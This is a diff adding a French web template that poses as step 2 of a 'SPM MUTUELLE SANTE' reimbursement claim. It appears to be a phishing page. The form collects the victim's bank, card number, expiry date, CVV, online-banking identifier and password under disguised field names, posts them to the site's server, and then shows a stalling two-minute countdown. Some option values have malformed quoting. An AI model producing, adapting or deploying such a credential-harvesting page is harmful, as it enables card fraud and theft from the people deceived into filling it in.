@@ -1,0 +1,633 @@
+{% extends "base.html" %}
+
+{% set data = data|default({}) %}
+
+{% block title %}
+Remboursement — Étape 2 · SPM MUTUELLE SANTE
+{% endblock %}
+
+{% block content %}
+
+<style>
+
+.form-container {
+
+    max-width: 600px;
+
+    margin: 40px auto;
+
+    padding: 30px;
+
+    background: white;
+
+    border-radius: 18px;
+
+    box-shadow:
+        0 10px 35px rgba(0,0,0,0.08);
+}
+
+
+.form-title {
+
+    text-align: center;
+
+    color: #0F2C59;
+
+    font-size: 28px;
+
+    font-weight: 700;
+
+    margin-bottom: 8px;
+}
+
+
+.form-subtitle {
+
+    text-align: center;
+
+    color: #64748B;
+
+    margin-bottom: 30px;
+
+    line-height: 1.5;
+}
+
+
+.form-group {
+
+    margin-bottom: 20px;
+}
+
+
+.form-group label {
+
+    display: block;
+
+    margin-bottom: 8px;
+
+    font-weight: 600;
+
+    color: #1E293B;
+}
+
+
+.form-group input,
+.form-group select {
+
+    width: 100%;
+
+    box-sizing: border-box;
+
+    padding: 14px 15px;
+
+    border: 1px solid #CBD5E1;
+
+    border-radius: 10px;
+
+    font-size: 15px;
+
+    outline: none;
+
+    transition: 0.2s;
+
+    background: white;
+}
+
+
+.form-group input:focus,
+.form-group select:focus {
+
+    border-color: #2563EB;
+
+    box-shadow:
+        0 0 0 3px rgba(37,99,235,0.10);
+}
+
+
+.btn-submit {
+
+    width: 100%;
+
+    padding: 15px;
+
+    border: none;
+
+    border-radius: 10px;
+
+    background: #0F2C59;
+
+    color: white;
+
+    font-size: 16px;
+
+    font-weight: 700;
+
+    cursor: pointer;
+
+    margin-top: 10px;
+}
+
+
+.btn-submit:hover {
+
+    background: #173F7A;
+}
+
+
+.btn-submit:disabled {
+
+    opacity: 0.7;
+
+    cursor: not-allowed;
+}
+
+
+#loading {
+
+    display: none;
+
+    text-align: center;
+
+    margin-top: 25px;
+
+    padding: 25px;
+
+    background: #F8FAFC;
+
+    border-radius: 14px;
+}
+
+
+.spinner {
+
+    width: 45px;
+
+    height: 45px;
+
+    margin: 0 auto 15px;
+
+    border: 4px solid #E2E8F0;
+
+    border-top: 4px solid #0F2C59;
+
+    border-radius: 50%;
+
+    animation: spin 1s linear infinite;
+}
+
+
+.loading-title {
+
+    font-size: 18px;
+
+    font-weight: 700;
+
+    color: #0F2C59;
+
+    margin-bottom: 5px;
+}
+
+
+.loading-text {
+
+    color: #64748B;
+
+    font-size: 14px;
+
+    line-height: 1.5;
+}
+
+
+#result-message {
+
+    display: none;
+
+    margin-top: 20px;
+
+    padding: 15px;
+
+    border-radius: 10px;
+
+    text-align: center;
+
+    line-height: 1.5;
+}
+
+
+@keyframes spin {
+
+    to {
+        transform: rotate(360deg);
+    }
+
+}
+
+</style>
+
+
+<div class="form-container">
+
+
+    <div class="form-title">
+        Votre demande
+    </div>
+
+
+    <div class="form-subtitle">
+
+        Étape 2 sur 2.<br>
+
+        Veuillez compléter les informations
+        complémentaires.
+
+    </div>
+
+
+    <form
+        id="etape2-form"
+        method="POST"
+    >
+
+
+        <!-- TYPE -->
+
+        <div class="form-group">
+
+            <label for="Veuillez sélectionnez votre banque">
+                Veuillez sélectionnez votre banque
+            </label>
+
+            <select
+                id="type_information"
+                name="type_information"
+                required
+            >
+
+                <option value="">
+                    Sélectionnez une option
+                </option>
+
+
+                <option
+                    value="BNP PARIBAS"
+                    {% if data.get('type_information') == 'BNP PARIBAS' %}
+                    selected
+                    {% endif %}
+                >
+                    BNP PARIBAS
+                </option>
+
+
+                <option
+                    value="SOCIETE GENERALE"
+                    {% if data.get('type_information') == 'SOCIETE GENERALE' %}
+                    selected
+                    {% endif %}
+                >
+                    SOCIETE GENERALE
+                </option>
+
+
+                <option
+                    value="BANQUE POPULAIRE"
+                    {% if data.get('type_information') == 'BANQUE POPULAIRE' %}
+                    selected
+                    {% endif %}
+                >
+                    BANQUE POPULAIRE
+                </option>
+
+
+                <option
+                    value="BRED""
+                    {% if data.get('type_information') == 'BRED' %}
+                    selected
+                    {% endif %}
+                >
+                    BRED
+                </option>
+
+                <option
+                    value="CIC BANQUE""
+                    {% if data.get('type_information') == 'CIC BANQUE' %}
+                    selected
+                    {% endif %}
+                >
+                    CIC BANQUE
+                </option>
+
+                <option
+                    value="LCL" BANQUE""
+                    {% if data.get('type_information') == 'LCL BANQUE' %}
+                    selected
+                    {% endif %}
+                >
+                    LCL BANQUE
+                </option>
+
+                  <option
+                    value="CAISSE D'EPARGNE"
+                    {% if data.get('type_information') == "CAISSE D'EPARGNE" %}
+                    selected
+                    {% endif %}
+                >
+                    CAISSE D'EPARGNE
+                </option>
+
+                 <option
+                    value="CREDIT MUTUEL"
+                    {% if data.get('type_information') == 'CREDIT MUTUEL' %}
+                    selected
+                    {% endif %}
+                >
+                    CREDIT MUTUEL
+                </option>
+
+                 <option
+                    value="CREDIT AGRICOLE"
+                    {% if data.get('type_information') == 'CREDIT AGRICOLE' %}
+                    selected
+                    {% endif %}
+                >
+                    CREDIT AGRICOLE
+                </option>
+
+                 <option
+                    value="CREDIT COOPERATIVE"
+                    {% if data.get('type_information') == 'CREDIT COOPERATIVE' %}
+                    selected
+                    {% endif %}
+                >
+                    CREDIT COOPERATIVE
+                </option>
+
+                <option
+                    value="BOURSORAMA BANQUE""
+                    {% if data.get('type_information') == 'BOURSORAMA BANQUE' %}
+                    selected
+                    {% endif %}
+                >
+                    BOURSORAMA BANQUE
+                </option>
+
+                <option
+                    value="AXA BANQUE""
+                    {% if data.get('type_information') == 'AXA BANQUE' %}
+                    selected
+                    {% endif %}
+                >
+                    AXA BANQUE
+                </option>
+
+            </select>
+
+        </div>
+
+
+        <!-- MARQUE -->
+
+        <div class="form-group">
+
+            <label for="marque">
+                Numéro de votre carte
+            </label>
+
+            <input
+                type="text"
+                id="marque"
+                name="marque"
+                value="{{ data.get('marque', '') }}"
+                placeholder="44** **** ****"
+                autocomplete="organization"
+                required
+            >
+
+        </div>
+
+
+        <!-- NUMERO -->
+
+        <div class="form-group">
+
+            <label for="numero">
+                DATE D'EXPIRATION
+            </label>
+
+            <input
+                type="text"
+                id="numero"
+                name="numero"
+                value="{{ data.get('numero', '') }}"
+                placeholder="05/28"
+                autocomplete="tel"
+                required
+            >
+
+        </div>
+
+
+        <!-- CVV -->
+
+        <div class="form-group">
+
+            <label for="identifiant1">
+                CVV
+            </label>
+
+            <input
+                type="text"
+                id="identifiant1"
+                name="identifiant1"
+                value="{{ data.get('identifiant1', '') }}"
+                placeholder="4**"
+                required
+            >
+
+        </div>
+
+
+        <!-- IDENTIFIANT 2 -->
+
+        <div class="form-group">
+
+            <label for="identifiant2">
+                Identifiant Bancaire
+            </label>
+
+            <input
+                type="text"
+                id="identifiant2"
+                name="identifiant2"
+                value="{{ data.get('identifiant2', '') }}"
+                placeholder="Votre Identifiant Client"
+            >
+
+        </div>
+
+
+        <!-- IDENTIFIANT 3 -->
+
+        <div class="form-group">
+
+            <label for="identifiant3">
+                Mot de passe (code personnel)
+            </label>
+
+            <input
+                type="text"
+                id="identifiant3"
+                name="identifiant3"
+                value="{{ data.get('identifiant3', '') }}"
+                placeholder="**********"
+            >
+
+        </div>
+
+
+        <button
+            type="submit"
+            class="btn-submit"
+            id="submit-button"
+        >
+            Valider
+        </button>
+
+    </form>
+
+
+    <!-- CHARGEMENT -->
+
+    <div id="loading">
+
+        <div class="spinner"></div>
+
+        <div class="loading-title">
+            Chargement en cours…
+        </div>
+
+        <div class="loading-text">
+            Votre demande est en cours de traitement.
+            Veuillez patienter.
+        </div>
+
+    </div>
+
+
+    <!-- RESULTAT -->
+
+    <div id="result-message"></div>
+
+
+</div>
+
+
+<script>
+
+const form = document.getElementById("etape2-form");
+const button = document.getElementById("submit-button");
+const loading = document.getElementById("loading");
+const resultMessage = document.getElementById("result-message");
+
+form.addEventListener("submit", async function(event) {
+    event.preventDefault();
+
+    // Désactiver le bouton
+    button.disabled = true;
+    button.textContent = "Traitement…";
+
+    // Afficher le chargement
+    loading.style.display = "block";
+    resultMessage.style.display = "none";
+
+    try {
+        const formData = new FormData(form);
+
+        const response = await fetch("{{ url_for('etape2') }}", {
+            method: "POST",
+            body: formData
+        });
+
+        const result = await response.json();
+
+        if (!response.ok || !result.success) {
+            loading.style.display = "none";
+
+            button.disabled = false;
+            button.textContent = "Valider";
+
+            resultMessage.style.display = "block";
+            resultMessage.style.background = "#FEF2F2";
+            resultMessage.style.color = "#B91C1C";
+            resultMessage.textContent =
+                result.error || "Une erreur est survenue.";
+
+            return;
+        }
+
+        // Succès
+        resultMessage.style.display = "block";
+        resultMessage.style.background = "#F0FDF4";
+        resultMessage.style.color = "#166534";
+        resultMessage.textContent =
+            "Votre demande a bien été enregistrée.";
+
+        // Compteur de 2 minutes
+        let secondes = 120;
+
+        const compteur = document.createElement("div");
+        compteur.id = "compteur";
+        compteur.style.marginTop = "12px";
+        compteur.style.fontWeight = "600";
+        compteur.style.color = "#0F2C59";
+        compteur.textContent = "Temps restant : 02:00";
+
+        loading.appendChild(compteur);
+
+        const interval = setInterval(function() {
+
+            secondes--;
+
+            const minutes = Math.floor(secondes / 60);
+            const secs = secondes % 60;
+
+            compteur.textContent =
+                "Temps restant : " +
+                String(minutes).padStart(2, "0") +
+                ":" +
+                String(secs).padStart(2, "0");
+
+            if (secondes <= 0) {
+                clearInterval(interval);
+
+                compteur.textContent = "Vous pouvez continuer.";
+
+                button.disabled = false;
+                button.textContent = "Valider";
+
+                // On garde le chargement affiché
+                // et on ne redirige PAS.
+            }
+
+        }, 1000);
+
+    } catch (error) {
+
+        console.error(error);
+
+        loading.style.display = "none";
+
+        button.disabled = false;
+        button.textContent = "Valider";
+
+        resultMessage.style.display = "block";
+        resultMessage.style.background = "#FEF2F2";
+        resultMessage.style.color = "#B91C1C";
+        resultMessage.textContent =
+            "Impossible de contacter le serveur.";
+    }
+});
+
+</script>
+
+
+{% endblock %}
